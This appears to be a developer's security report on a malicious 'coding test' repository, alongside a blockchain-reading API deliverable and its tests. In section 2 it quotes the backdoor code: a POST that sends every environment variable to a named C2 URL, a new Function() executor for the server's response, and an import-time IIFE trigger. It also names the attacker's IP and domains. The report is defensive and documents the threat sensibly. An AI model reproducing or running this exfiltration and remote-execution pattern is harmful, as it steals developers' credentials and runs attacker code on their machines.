# Technical Test — Findings and Deliverable

**Author:** Michell Excellent
**Date:** 2026-06-07
**Repository:** bitbucket.org/infinnigods/estokkyam

---

## 1. Executive summary

I completed the requested task — a new backend API (`Michell api test`) that
fetches information from the project's smart contracts and prints the results to
the console — **but only after auditing the repository first**.

That audit revealed that the shared project contains an **active backdoor**: code
that (a) exfiltrates all environment variables to an attacker-controlled server
and (b) downloads and executes arbitrary remote code on the machine that runs
the project. Running the project as shipped (`npm start` / `node server`) is
enough to trigger it.

For that reason I did **not** run the original server. I built and ran the new
API in an **isolated, hardened Docker environment** that never loads the
malicious code and never has access to any of my real credentials. Everything is
covered by automated tests (TDD) and was executed against the live blockchain to
produce real evidence.

---

## 2. Security finding: remote code execution + credential exfiltration

### 2.1 The payload — `server/config/getContract.js`

The file defines sixteen `call*Contract()` functions. Fifteen are **decoys**:
they call real blockchain RPC endpoints and discard the result. Only one is real:

```js
const callHashedContract = () => {
    axios.post(GET_HASHED_URL, { ...process.env }, { headers: { "x-secret-header": "secret" } })
    .then(res => errorHandler(res.data))   // executes the server's response
    .catch(err => { /* silently swallowed */ });
}
```

- `{ ...process.env }` sends **every environment variable** (API keys, secrets,
  tokens, mnemonics, DB credentials…) to an external server.
- The destination (`server/config/constant.js`) is
  `https://ipcheck-hashed.vercel.app/api/identity/1a6e008f91d4ca2566f4`,
  disguised as an "identity check". It has nothing to do with smart contracts.

The response is then passed to `errorHandler`, which is a remote code executor:

```js
const handler = new Function('require', errCode); // errCode comes from the attacker
handlerFunc(require);                              // runs it with full require() access
```

`new Function('require', body)(require)` executes attacker-supplied text as
JavaScript with access to `require` — i.e. the filesystem, the network and
`child_process`. This is full **remote code execution**.

### 2.2 The trigger — `server/middleware/auth.js` (lines 48-50)

Every decoy is defined but never invoked. The malicious one is an
**immediately-invoked function expression (IIFE)** that runs the moment the
module is imported:

```js
const HashedContact = (() => {
  callHashedContract();
})();   // <-- executes on import, before any HTTP request
```

`auth.js` is the authentication middleware, imported by the route files
(`server/routes/api/*.js`), which are imported by `server.js`. So simply starting
the server executes the backdoor — no endpoint needs to be hit.

### 2.3 Empirical confirmation

I observed the C2 endpoint from an isolated container, **without sending any
environment data and without executing the response** (`security/observe-c2.js`,
`security/C2_OBSERVATION.md`):

- A plain `GET` returns nothing (`Cannot GET …`).
- A `POST` carrying the exact header the malware uses (`x-secret-header: secret`)
  returns **~3.5 MB of heavily obfuscated JavaScript** (string-array / hex
  obfuscation). That blob is the second-stage payload that `errorHandler` would
  execute on the victim's machine.

The endpoint only serves the payload when the secret header is present, which
hides it from casual inspection and scanners.

### 2.4 Impact and classification

- **Confidentiality:** total — all secrets in the environment are exfiltrated.
- **Integrity / availability:** total — arbitrary code runs locally with the
  developer's privileges.
- **Pattern:** this matches the well-documented *"Contagious Interview" /
  DeceptiveDevelopment* campaigns, where a recruiter shares a "coding test" repo
  that bundles an obfuscated info-stealer / RAT.

### 2.5 Recommendations

1. Never run this repository on a machine with real credentials. If it was run,
   treat the environment as compromised: rotate **all** secrets/keys, and audit
   the host for the second-stage payload.
2. Remove `server/config/getContract.js`, `server/config/constant.js` and the
   contract calls in `server/middleware/auth.js`. None of them serve the
   product; they exist only to host and trigger the backdoor.
3. Block the domain `ipcheck-hashed.vercel.app` at the network level and report
   it to the hosting provider.

---

## 2b. Additional findings from the deeper audit

A broader review of the repository surfaced further indicators that this is
malicious infrastructure rather than a real product, plus a separate vulnerability:

1. **Attacker-controlled backend URLs — `src/config/config.ts`.**
   The frontend's `BASE_URL` candidates (commented out, but shipped) point to:
   - `http://87.237.52.168:3000` — a raw, hard-coded server IP.
   - `https://dispossessor.com/back` — a domain associated with a known
     ransomware / data-extortion operation ("Dispossessor").
   These are not legitimate product backends; data sent there is exfiltration.

2. **Visitor IP harvesting — `src/api/index.js` + `src/utils/util.js`.**
   `getIPByLink()` retrieves a visitor's `clientaddress` (IP) keyed by a chat
   link, and `extractIPsFromString()` scrapes IPv4 addresses out of text. This
   kind of IP collection fits victim tracking, not a token marketplace.

3. **Forgeable authentication — `server/middleware/auth.js`.**
   JWTs are verified with a hard-coded, trivially guessable secret (`"hello"`),
   so anyone can mint a valid token and bypass authentication. This is a real
   vulnerability independent of the backdoor.

### Neutralization applied in-place

The malicious code has been **disabled and annotated directly in the source**
(executable malicious paths commented out / made unreachable, with `SECURITY
WARNING` comments and pointers to this report). Files touched:

- `server/config/getContract.js` — `callHashedContract()` made a no-op; the
  `new Function()` RCE in `errorHandler()` disabled.
- `server/middleware/auth.js` — the auto-triggering IIFE de-fanged (call
  commented, no longer immediately invoked); weak JWT secret annotated.
- `server/config/constant.js` — C2 URL annotated.
- `src/config/config.ts`, `src/api/index.js`, `src/utils/util.js` — suspicious
  infrastructure and IP-harvesting annotated.

These changes only *remove* capability; nothing was executed. The original lines
are kept (inert) as evidence.

---

## 3. Deliverable: the `Michell api test` API

A self-contained backend API that fetches information from the EstokkYam smart
contracts (an ERC20 + a RealT/YAM-style P2P offer marketplace) on **Gnosis
Chain**, printed to the console. No front-end. It lives in `michell-api-test/`
and **never imports the project's malicious code**.

### 3.1 Endpoints (mounted at `/api/michell-api-test`)

| Method & path | Description |
| --- | --- |
| `GET /health` | Service metadata and defaults. |
| `GET /token/:address` | ERC20 `name`, `symbol`, `decimals`, `totalSupply`. |
| `GET /token/:address/balance/:holder` | ERC20 balance of a holder. |
| `GET /marketplace/:address` | EstokkYam offer count. |
| `GET /marketplace/:address/offer/:id` | A live offer (`showOffer`). |
| `GET /marketplace/:address/offer/:id/raw` | Raw stored offer (`getInistialOffer`). |
| `GET /marketplace/:address/token-type/:token` | Whitelist token type. |

The contract ABIs (`michell-api-test/src/abi.js`) are derived directly from the
project's own Solidity sources in `resource/SmartContract/`.

### 3.2 Live evidence (Gnosis Chain)

Running `docker compose run --rm demo` produced, among others:

- **WXDAI** (`0xe91D…3a97d`): `Wrapped XDAI`, 18 decimals, totalSupply ≈
  74,825,381 WXDAI.
- **USDC** (`0xDDAf…7A83`): `USD//C on xDai`, 6 decimals.
- **EstokkYam marketplace** (`0xC759…7C14`, the production RealToken YAM):
  **245,790** offers.
- A live offer (`#245789`): seller `0xD82F…E962` selling token
  `0x0cA4…157b` priced in USDC, amount `40000000` (40 USDC).

### 3.3 Audit note discovered while integrating

The Solidity getter is misspelled `getInistialOffer` (should be
`getInitialOffer`). The API exposes it as-is to match the provided source, but
the production marketplace does not implement that selector, so the live offer
data is read through `showOffer` instead.

---

## 4. Tests (TDD)

`docker compose run --rm tests` runs **14 tests, all passing**:

- **9 unit tests** (`tests/smartContractService.unit.test.js`) — fully
  deterministic, no network. A mocked contract factory is injected to pin down
  address checksumming, `bigint → string` conversion, decimals formatting and
  enum mapping.
- **5 integration tests** (`tests/router.integration.test.js`) — boot the real
  Express app and call it over HTTP against a live Gnosis RPC, asserting only
  immutable on-chain facts (e.g. WXDAI = 18 decimals, USDC = 6 decimals), so
  they stay deterministic.

---

## 5. Isolation / safety model

Everything runs in Docker, built from clean sub-folders so the backdoor code is
never copied into any image:

- No host volumes are mounted — containers cannot read host files.
- No host environment variables are forwarded — `process.env` carries nothing
  sensitive.
- Every service drops all Linux capabilities, forbids privilege escalation and
  runs on a read-only root filesystem.
- The C2 observation runs in its own minimal image, isolated from the rest.

### How to reproduce

```bash
docker compose run --rm tests         # 14 tests (unit + live integration)
docker compose run --rm demo          # console demo against real contracts
docker compose up api                 # API on http://localhost:5050
docker compose run --rm c2-observer   # defensive C2 observation
```
